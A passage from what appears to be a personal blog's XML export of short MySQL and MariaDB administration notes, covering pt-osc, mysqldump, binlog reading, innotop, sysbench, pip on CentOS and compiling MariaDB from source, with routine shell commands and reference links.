<h3 id="InnoDB-Cluster">InnoDB Cluster</h3>
<h3 id="Galera-Cluster">Galera Cluster</h3>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/shawn0915/mariadb-tools/tree/master/healthcheck" >https://github.com/shawn0915/mariadb-tools/tree/master/healthcheck <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>monitor</tag>
      </tags>
  </entry>
  <entry>
    <title>细说pt-osc</title>
    <url>/2018/mysql/pt-osc-detail/</url>
    <content><![CDATA[<h2 id="Flow">Flow</h2>
<h2 id="Usage">Usage</h2>
<h2 id="Mark">Mark</h2>
<p>使用OSC会使增加一倍的空间，包括索引而且在 Row Based Replication 下，还会写一份binlog。不要想当然使用 <code>--set-vars</code> 去设置 <code>sql_log_bin=0</code>，因为在这个session级别，alter语句也要在从库上执行，除非你对从库另有打算。</p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="http://www.cnblogs.com/erisen/p/5971416.html" >pt-online-schema-change使用说明、限制与比较 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Percona</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>pt-osc</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 主要分支</title>
    <url>/2018/mysql/mysql-server-branch/</url>
    <content><![CDATA[<ul>
<li>MySQL</li>
<li>Percona Server for MySQL</li>
<li>MariaDB</li>
</ul>
<blockquote>
<p>“MySQL 5.6, should be comparable to MariaDB Server 10.1. And for 10.2 it should be compatible with MySQL 5.7” — Michael “Monty” Widenius, CTO of MariaDB Corporation and MariaDB Foundation, 7 October 2016, MariaDB Developer’s Meeting, Amsterdam</p>
</blockquote>
<p>！<a href="/img/mysql/mysql-roadMap.jpeg"></a></p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://www.percona.com/sites/default/files/presentations/Differences-between-MariaDB-Server-and-MySQL.pdf" >https://www.percona.com/sites/default/files/presentations/Differences-between-MariaDB-Server-and-MySQL.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://www.thecompletelistoffeatures.com/" >http://www.thecompletelistoffeatures.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/system-variable-differences-between-mariadb-and-mysql/" >https://mariadb.com/kb/en/library/system-variable-differences-between-mariadb-and-mysql/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/mariadb-vs-mysql-compatibility/" >https://mariadb.com/kb/en/library/mariadb-vs-mysql-compatibility/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://jira.mariadb.org/browse/MDEV-10392" >Document incompatibilities between MariaDB 10.1 and MySQL 5.7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>percona</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL Client Programs</title>
    <url>/2018/mysql/mysql-client/</url>
    <content><![CDATA[<h2 id="mysqlshow">mysqlshow</h2>
<ul>
<li>Usage</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># status</span></span><br><span class="line">mysqlshow -uroot <span class="built_in">test</span> -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># count</span></span><br><span class="line">mysqlshow -uroot <span class="built_in">test</span> --count</span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">mysqlshow -uroot <span class="built_in">test</span> author -k</span><br></pre></td></tr></table></figure></div>
<h2 id="mysqldump">mysqldump</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># table</span></span><br><span class="line">mysqldump -uroot -d -B testdb &gt; testdb_table_bk_`<span class="built_in">date</span> +%Y%m%d_%H%M%S`.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">mysqldump -uroot -t -B testdb &gt; testdb_data_bk_`<span class="built_in">date</span> +%Y%m%d_%H%M%S`.sql</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>client</tag>
        <tag>mysqldump</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 日志</title>
    <url>/2018/mysql/mysql-log/</url>
    <content><![CDATA[<h2 id="MySQL-Logs">MySQL Logs</h2>
<ul>
<li>binary log</li>
<li>error log</li>
<li>slow log</li>
<li>audit log</li>
</ul>
<h2 id="Audit-Log">Audit Log</h2>
<p>format</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">timestamp</span>]<span class="string">,[serverhost],[username],[host],[connectionid],</span></span><br><span class="line">[<span class="string">queryid</span>]<span class="string">,[operation],[database],[object],[retcode]</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Check-Logs">Check Logs</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bin log</span></span><br><span class="line">mysqlbinlog MYSID.000041 -d <span class="built_in">test</span> -s -r test_binlog.log</span><br><span class="line"><span class="comment"># mysqlbinlog MYSID.000041 -vv --base64-output=DECODE-ROWS -d test --start-position=1120 --stop-position=1919</span></span><br><span class="line">mysqlbinlog -vv --base64-output=DECODE-ROWS MYSID.000041 -d <span class="built_in">test</span></span><br><span class="line"><span class="comment">## 日志事件偏移量</span></span><br><span class="line">mysqlbinlog MYSID.000001 | egrep <span class="string">&#x27;^# at &#x27;</span></span><br><span class="line">strings -n 2 -t d MYSID.000001</span><br><span class="line"></span><br><span class="line"><span class="comment"># slow log</span></span><br><span class="line">mysqldumpslow slow.log</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>log</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL AWR</title>
    <url>/2018/mysql/mysql-awr/</url>
    <content><![CDATA[<h2 id="MySQL-AWR">MySQL AWR</h2>
<ul>
<li>Server overview</li>
<li>Tuning charts</li>
<li>Wait state analyzer</li>
<li>I/O by tablespace &amp; file</li>
<li>Performance indicators</li>
<li>Server statistics</li>
<li>Parameter editor (P-file editor)</li>
</ul>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/shawn0915/mariadb-tools" >https://github.com/shawn0915/mariadb-tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/thinkdb/MySQL_Diagnose" >https://github.com/thinkdb/MySQL_Diagnose <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/noodba/myawr" >https://github.com/noodba/myawr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://gitee.com/ruzuojun/Lepus" >https://gitee.com/ruzuojun/Lepus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>awr</tag>
      </tags>
  </entry>
  <entry>
    <title>About orzdba</title>
    <url>/2018/mysql/mysql-tools-orzdba/</url>
    <content><![CDATA[<h2 id="OrzDBA">OrzDBA</h2>
<p>Perl脚本，用于对Linux主机和MySQL相关指标进行实时监控。</p>
<p>Usage</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system load</span></span><br><span class="line">orzdba -sys</span><br><span class="line">orzdba -lazy -rt -S /var/lib/mysql/mysql.sock</span><br><span class="line"><span class="comment"># mysql server</span></span><br><span class="line">orzdba -mysql -S /var/lib/mysql/mysql.sock</span><br><span class="line"><span class="comment"># innodb</span></span><br><span class="line">orzdba -innodb -S /var/lib/mysql/mysql.sock</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="http://code.taobao.org/p/orzdba/src/trunk/" >http://code.taobao.org/p/orzdba/src/trunk/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/shawn0915/mariadb-tools" >https://github.com/shawn0915/mariadb-tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.hi-linux.com/posts/2395.html" >https://www.hi-linux.com/posts/2395.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>monitor</tag>
        <tag>taobao</tag>
        <tag>orzdba</tag>
      </tags>
  </entry>
  <entry>
    <title>About InnoTop</title>
    <url>/2018/mysql/about-innotop/</url>
    <content><![CDATA[<h2 id="InnoTop">InnoTop</h2>
<p>A realtime terminal-based top-like monitor for MySQL.</p>
<h2 id="Compile">Compile</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BuildRequires</span></span><br><span class="line">yum install -y make</span><br><span class="line">yum install -y perl-ExtUtils-MakeMaker</span><br><span class="line">yum install -y perl-Test-Simple</span><br><span class="line">yum install -y perl-DBI</span><br><span class="line">yum install -y perl-DBD-MySQL</span><br><span class="line">yum install -y perl-TermReadKey</span><br><span class="line">yum install -y perl-Time-HiRes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Requires</span></span><br><span class="line">yum install -y perl-DBI</span><br><span class="line">yum install -y perl-DBD-MySQL</span><br><span class="line">yum install -y perl-TermReadKey</span><br><span class="line">yum install -y perl-Time-HiRes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compile</span></span><br><span class="line">perl Makefile.PL</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<h2 id="Usage">Usage</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: innotop &lt;options&gt; &lt;innodb-status-file&gt;</span><br><span class="line"></span><br><span class="line">  --askpass          Prompt <span class="keyword">for</span> a password when connecting to MySQL</span><br><span class="line">  --[no]color   -C   Use terminal coloring (default)</span><br><span class="line">  --config      -c   Config file to <span class="built_in">read</span></span><br><span class="line">  --count            Number of updates before exiting</span><br><span class="line">  --delay       -d   Delay between updates <span class="keyword">in</span> seconds</span><br><span class="line">  --<span class="built_in">help</span>             Show this <span class="built_in">help</span> message</span><br><span class="line">  --host        -h   Connect to host</span><br><span class="line">  --[no]inc     -i   Measure incremental differences</span><br><span class="line">  --mode        -m   Operating mode to start <span class="keyword">in</span></span><br><span class="line">  --nonint      -n   Non-interactive, output tab-separated fields</span><br><span class="line">  --password    -p   Password to use <span class="keyword">for</span> connection</span><br><span class="line">  --port        -P   Port number to use <span class="keyword">for</span> connection</span><br><span class="line">  --skipcentral -s   Skip reading the central configuration file</span><br><span class="line">  --socket      -S   MySQL socket to use <span class="keyword">for</span> connection</span><br><span class="line">  --spark            Length of status sparkline (default 10)</span><br><span class="line">  --timestamp   -t   Print timestamp <span class="keyword">in</span> -n mode (1: per iter; 2: per line)</span><br><span class="line">  --user        -u   User <span class="keyword">for</span> login <span class="keyword">if</span> not current user</span><br><span class="line">  --version          Output version information and <span class="built_in">exit</span></span><br><span class="line">  --write       -w   Write running configuration into home directory <span class="keyword">if</span> no config files were loaded</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://waffle.io/innotop/innotop" >https://waffle.io/innotop/innotop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/innotop/innotop" >https://github.com/innotop/innotop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/shawn0915/innotop" >https://github.com/shawn0915/innotop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>innotop</tag>
      </tags>
  </entry>
  <entry>
    <title>Benchmark with Sysbench on MariaDB</title>
    <url>/2018/mysql/benchmark-with-sysbench-on-mariadb/</url>
    <content><![CDATA[<h2 id="Sysbench">Sysbench</h2>
<ul>
<li>Dependencies</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install make automake libtool pkgconfig libaio-devel</span><br><span class="line"><span class="comment"># For MySQL support, replace with mysql-devel on RHEL/CentOS 5</span></span><br><span class="line">yum -y install mariadb-devel</span><br><span class="line"><span class="comment"># For PostgreSQL support</span></span><br><span class="line">yum -y install postgresql-devel</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Sysbench v1.0.14</li>
</ul>
<p><a class="link"   href="https://github.com/shawn0915/mariadb-tools" >https://github.com/shawn0915/mariadb-tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Key-Parameter">Key Parameter</h2>
<ul>
<li>Server</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cpu</span><br><span class="line">memory</span><br><span class="line">disk</span><br><span class="line">network</span><br></pre></td></tr></table></figure></div>
<ul>
<li>OS</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">os version</span><br><span class="line">kernel version</span><br></pre></td></tr></table></figure></div>
<ul>
<li>MariaDB</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">version</span><br><span class="line">innodb_buffer_pool_size</span><br><span class="line">innodb_buffer_pool_instances</span><br><span class="line">sync_binlog</span><br><span class="line">innodb_page_size</span><br><span class="line">innodb_doublewrite</span><br><span class="line">innodb_flush_log_at_trx_commit</span><br><span class="line">PS</span><br></pre></td></tr></table></figure></div>
<h2 id="Usage">Usage</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sysbench prepare/run/cleanup</span><br><span class="line"></span><br><span class="line">sysbench --db-driver=mysql --mysql_storage_engine=innodb --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password= --mysql-db=oltpdb --mysql-socket=/var/lib/mysql/mysql.sock --report-interval=1 --time=300 --tables=100 --table_size=20000 /opt/mariadb-tools/sysbench/share/sysbench/oltp_read_write.lua prepare</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/akopytov/sysbench" >https://github.com/akopytov/sysbench <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/akopytov/sysbench/releases" >https://github.com/akopytov/sysbench/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://src.fedoraproject.org/cgit/rpms/sysbench.git/" >https://src.fedoraproject.org/cgit/rpms/sysbench.git/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.oschina.net/question/12_90065" >https://www.oschina.net/question/12_90065 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/MariaDB/mariadb.org-tools/blob/master/sysbench/run-sysbench.sh" >https://github.com/MariaDB/mariadb.org-tools/blob/master/sysbench/run-sysbench.sh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/MariaDB/mariadb.org-tools/tree/master/sysbench" >https://github.com/MariaDB/mariadb.org-tools/tree/master/sysbench <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>kit</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>sysbench</tag>
        <tag>benchmark</tag>
      </tags>
  </entry>
  <entry>
    <title>Say hello to MariaDB with ProxySQL</title>
    <url>/2018/mysql/say-hello-to-mariadb-with-proxysql/</url>
    <content><![CDATA[<h2 id="MariaDB-with-ProxySQL">MariaDB with ProxySQL</h2>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="http://www.proxysql.com/" >http://www.proxysql.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/sysown/proxysql/blob/master/doc/admin_tables.md" >https://github.com/sysown/proxysql/blob/master/doc/admin_tables.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://proxysql.blogspot.jp/" >http://proxysql.blogspot.jp/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/sysown/proxysql/wiki/Configuring-ProxySQL" >https://github.com/sysown/proxysql/wiki/Configuring-ProxySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/sysown/proxysql/wiki/Global-variables" >https://github.com/sysown/proxysql/wiki/Global-variables <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MariaDB</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>proxysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Book List</title>
    <url>/2018/python/python-books/</url>
    <content><![CDATA[<h2 id="Books">Books</h2>
<ul>
<li><a class="link"   href="http://python.itcarlow.ie/" >Head First Python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Learning Python</li>
<li>Programming Python</li>
<li>Python in a Nutshell</li>
<li>Python Cookbook</li>
<li>Python for Unix and Linux System Administration</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>book</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Install pip on CentOS</title>
    <url>/2018/python/python-install-pip-on-centos/</url>
    <content><![CDATA[<h2 id="Environment">Environment</h2>
<blockquote>
<p>CentOS Linux release 7.4.1708 (Core)</p>
<p>python 2.7.5</p>
<p>pip 9.0.3</p>
</blockquote>
<h2 id="Step">Step</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python --version</span><br><span class="line">Python 2.7.5</span><br><span class="line"></span><br><span class="line">yum install -y python2-pip</span><br><span class="line"></span><br><span class="line">pip --version</span><br><span class="line">pip 8.1.2 from /usr/lib/python2.7/site-packages (python 2.7)</span><br><span class="line"></span><br><span class="line">pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip --version</span><br><span class="line">pip 9.0.3 from /usr/lib/python2.7/site-packages (python 2.7)</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://pypi.python.org/pypi" >https://pypi.python.org/pypi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://pypi.org/" >https://pypi.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>Build MariaDB by Dockerfile</title>
    <url>/2018/docker/docker-build-mariadb-by-dockerfile/</url>
    <content><![CDATA[<h2 id="Environment">Environment</h2>
<blockquote>
<p>CentOS Linux release 7.4.1708 (Core)</p>
<p>Docker-CE</p>
<p>MariaDB 10.2</p>
</blockquote>
<h2 id="Step">Step</h2>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://mirrors.aliyun.com/" >https://mirrors.aliyun.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>mariadb</tag>
        <tag>dockerfile</tag>
      </tags>
  </entry>
  <entry>
    <title>Build MariaDB by Compiling Source</title>
    <url>/2018/mysql/build-mariadb-by-compiling-src/</url>
    <content><![CDATA[<h2 id="Environment">Environment</h2>
<blockquote>
<p>CentOS 7.4 running in VMware</p>
<p>MariaDB 10.2.14</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">d98cce6f3c0e2971afa061fc67183b91  mariadb-10.2.14.tar.gz</span><br></pre></td></tr></table></figure></div>
<h2 id="Step">Step</h2>
<ul>
<li>Prepare</li>
<li>Compiling</li>
</ul>
<h3 id="Prepare-Compiling-Environment">Prepare Compiling Environment <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># C++ toolkit</span></span><br><span class="line">sudo yum groupinstall -y <span class="string">&#x27;Development Tools&#x27;</span></span><br><span class="line">sudo yum install -y cmake</span><br><span class="line">sudo yum install -y libaio-devel</span><br><span class="line">sudo yum install -y ncurses-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># memory alloc</span></span><br><span class="line">sudo yum install -y jemalloc-3.6.0-1.el7.x86_64.rpm</span><br><span class="line">sudo yum install -y jemalloc-devel-3.6.0-1.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># other compiling dependency</span></span><br><span class="line">sudo yum install -y git</span><br><span class="line">sudo yum install -y gzip</span><br><span class="line">sudo yum install -y libevent-devel</span><br><span class="line">sudo yum install -y glibc</span><br><span class="line">sudo yum install -y perl</span><br><span class="line">sudo yum install -y perl-Data-Dumper</span><br><span class="line">sudo yum install -y libaio</span><br><span class="line">sudo yum install -y libaio-devel</span><br><span class="line">sudo yum install -y time</span><br><span class="line">sudo yum install -y numactl-devel</span><br><span class="line">sudo yum install -y openssl-devel</span><br><span class="line">sudo yum install -y zlib-devel</span><br><span class="line">sudo yum install -y cyrus-sasl-devel</span><br><span class="line">sudo yum install -y perl-Env</span><br><span class="line">sudo yum install -y rpm-build</span><br><span class="line">sudo yum install -y bzip2-devel</span><br><span class="line">sudo yum install -y curl-devel</span><br><span class="line">sudo yum install -y liblzf-devel</span><br><span class="line">sudo yum install -y libxml2-devel</span><br><span class="line">sudo yum install -y unixODBC</span><br><span class="line"></span><br><span class="line"><span class="comment"># policy</span></span><br><span class="line">sudo yum install -y checkpolicy</span><br><span class="line">sudo yum install -y policycoreutils</span><br><span class="line">sudo yum install -y policycoreutils-python</span><br></pre></td></tr></table></figure></div>
<h3 id="Compiling-MariaDB">Compiling MariaDB</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf mariadb-10.2.14.tar.gz</span><br><span class="line"><span class="built_in">cd</span> mariadb-10.2.14</span><br><span class="line"></span><br><span class="line">cmake . -LAH \</span><br><span class="line">-DBUILD_CONFIG=mysql_release \</span><br><span class="line">-DRPM=centos74 \</span><br><span class="line">-DCMAKE_BUILD_TYPE=RelWithDebInfo \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/opt/mysql \</span><br><span class="line">-DSYSCONFDIR=/etc \</span><br><span class="line">-DINSTALL_MYSQLDATADIR=/data/mysql \</span><br><span class="line">-DTMPDIR=/data/mysql/tmp \</span><br><span class="line">-DINSTALL_UNIX_ADDRDIR=/data/mysql/mysql.sock \</span><br><span class="line">-DDEFAULT_CHARSET=utf8 \</span><br><span class="line">-DDEFAULT_COLLATION=utf8_general_ci \</span><br><span class="line">-DWITH_EXTRA_CHARSETS=all \</span><br><span class="line">-DWIYH_SSL=system \</span><br><span class="line">-DWITH_ZLIB=system \</span><br><span class="line">-DWITH_JEMALLOC=<span class="built_in">yes</span> \</span><br><span class="line">-DPLUGIN_INNOBASE=YES \</span><br><span class="line">-DDWITH_WSREP=ON \</span><br><span class="line">-DWITH_INNODB_DISALLOW_WRITES=ON \</span><br><span class="line">-DPLUGIN_CONNECT=YES \</span><br><span class="line">-DPLUGIN_WSREP_INFO=YES \</span><br><span class="line">-DPLUGIN_METADATA_LOCK_INFO=YES \</span><br><span class="line">-DPLUGIN_DISKS=YES \</span><br><span class="line">-DAWS_SDK_EXTERNAL_PROJECT=0 \</span><br><span class="line">-DPLUGIN_ARCHIVE=NO \</span><br><span class="line">-DPLUGIN_ARIA=NO \</span><br><span class="line">-DPLUGIN_BLACKHOLE=NO \</span><br><span class="line">-DPLUGIN_OQGRAPH=NO \</span><br><span class="line">-DPLUGIN_MROONGA=NO \</span><br><span class="line">-DPLUGIN_ROCKSDB=NO \</span><br><span class="line">-DPLUGIN_SPIDER=NO \</span><br><span class="line">-DPLUGIN_TOKUDB=NO \</span><br><span class="line">-DPLUGIN_FEDERATED=NO \</span><br><span class="line">-DPLUGIN_FEEDBACK=NO \</span><br><span class="line">| <span class="built_in">tee</span> cmake.log</span><br><span class="line"></span><br><span class="line">make -j $(awk <span class="string">&#x27;/processor/&#123;i++&#125;END&#123;print i&#125;&#x27;</span> /proc/cpuinfo)</span><br><span class="line"><span class="comment"># make package</span></span><br><span class="line">make <span class="built_in">test</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<h2 id="Mark">Mark</h2>
<h3 id="删除CentOS7-4默认数据库文件">删除CentOS7.4默认数据库文件</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep mariadb | xargs rpm -e --nodeps</span><br><span class="line">find -H /etc/ | grep my.cnf</span><br></pre></td></tr></table></figure></div>
<h3 id="Development-Tools">Development Tools</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[root@vm-db01 mariadb-10.2.14]<span class="comment"># yum groupinfo &quot;Development Tools&quot;</span></span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: centos.ustc.edu.cn</span><br><span class="line"> * extras: centos.ustc.edu.cn</span><br><span class="line"> * updates: centos.ustc.edu.cn</span><br><span class="line"></span><br><span class="line">Group: Development Tools</span><br><span class="line"> Group-Id: development</span><br><span class="line"> Description: A basic development environment.</span><br><span class="line"> Mandatory Packages:</span><br><span class="line">   =autoconf</span><br><span class="line">   =automake</span><br><span class="line">    binutils</span><br><span class="line">   =bison</span><br><span class="line">   =flex</span><br><span class="line">   =gcc</span><br><span class="line">   =gcc-c++</span><br><span class="line">    gettext</span><br><span class="line">   =libtool</span><br><span class="line">    make</span><br><span class="line">   =patch</span><br><span class="line">    pkgconfig</span><br><span class="line">   =redhat-rpm-config</span><br><span class="line">   =rpm-build</span><br><span class="line">   =rpm-sign</span><br><span class="line"> Default Packages:</span><br><span class="line">   =byacc</span><br><span class="line">   =cscope</span><br><span class="line">   =ctags</span><br><span class="line">   =diffstat</span><br><span class="line">   =doxygen</span><br><span class="line">   =elfutils</span><br><span class="line">   =gcc-gfortran</span><br><span class="line">   =git</span><br><span class="line">   =indent</span><br><span class="line">   =intltool</span><br><span class="line">   =patchutils</span><br><span class="line">   =rcs</span><br><span class="line">   =subversion</span><br><span class="line">   =swig</span><br><span class="line">   =systemtap</span><br><span class="line"> Optional Packages:</span><br><span class="line">   ElectricFence</span><br><span class="line">   ant</span><br><span class="line">   babel</span><br><span class="line">   bzr</span><br><span class="line">   chrpath</span><br><span class="line">   cmake</span><br><span class="line">   compat-gcc-44</span><br><span class="line">   compat-gcc-44-c++</span><br><span class="line">   cvs</span><br><span class="line">   dejagnu</span><br><span class="line">   expect</span><br><span class="line">   gcc-gnat</span><br><span class="line">   gcc-objc</span><br><span class="line">   gcc-objc++</span><br><span class="line">   imake</span><br><span class="line">   javapackages-tools</span><br><span class="line">   ksc</span><br><span class="line">   libstdc++-docs</span><br><span class="line">   mercurial</span><br><span class="line">   mod_dav_svn</span><br><span class="line">   nasm</span><br><span class="line">   perltidy</span><br><span class="line">   python-docs</span><br><span class="line">   rpmdevtools</span><br><span class="line">   rpmlint</span><br><span class="line">   systemtap-sdt-devel</span><br><span class="line">   systemtap-server</span><br><span class="line">[root@vm-db01 mariadb-10.2.14]<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<h3 id="cmake">cmake</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cmake . --help-variable-list</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>cmake -LH</code> : All cmake configuration options for MariaDB can be displayed</li>
<li><code>make VERBOSE=1</code> : enable more compilation information</li>
